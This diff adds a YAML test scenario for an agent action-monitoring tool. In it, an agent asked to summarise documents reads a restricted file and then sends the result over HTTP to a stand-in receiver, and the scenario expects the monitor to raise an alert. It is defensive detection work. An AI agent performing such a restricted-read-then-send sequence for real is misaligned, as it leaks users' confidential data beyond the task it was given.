@@ -1,0 +1,59 @@
+apiVersion: actionlineage.dev/v1alpha1
+kind: Scenario
+metadata:
+  name: restricted-send-evidence-plane
+spec:
+  deterministic: true
+  principals:
+    initiator: user_demo
+    agent: agent_demo
+    credential: none
+  steps:
+    - eventType: agent.intent.recorded
+      summary: summarize workspace documents
+    - tool: safe_files.read
+      expectedLifecycle:
+        - tool.execution.requested
+        - tool.execution.authorized
+        - tool.execution.dispatched
+        - tool.execution.acknowledged
+      arguments:
+        path: docs/vendor-note.txt
+      observation:
+        observer: filesystem_observer
+        status: verified
+    - tool: safe_files.read
+      expectedLifecycle:
+        - tool.execution.requested
+        - tool.execution.authorized
+        - tool.execution.dispatched
+        - tool.execution.acknowledged
+      arguments:
+        path: docs/quarterly-plan.txt
+      classification:
+        sensitivity: restricted
+      observation:
+        observer: filesystem_observer
+        status: verified
+    - tool: safe_http.send
+      expectedLifecycle:
+        - tool.execution.requested
+        - tool.execution.authorized
+        - tool.execution.dispatched
+        - tool.execution.acknowledged
+      arguments:
+        destination: http://local-receiver.test/collect
+        bodyFromPreviousResult: true
+      observation:
+        observer: receiver_observer
+        status: verified
+  expected:
+    requiredStatuses:
+      - acknowledged
+      - observed
+      - verified
+    requiredEvidenceLinks:
+      - subjectEventType: tool.execution.acknowledged
+        evidenceEventType: side_effect.observed
+        verificationEventType: side_effect.verified
+    requiredAlert: restricted-read-followed-by-verified-untrusted-send
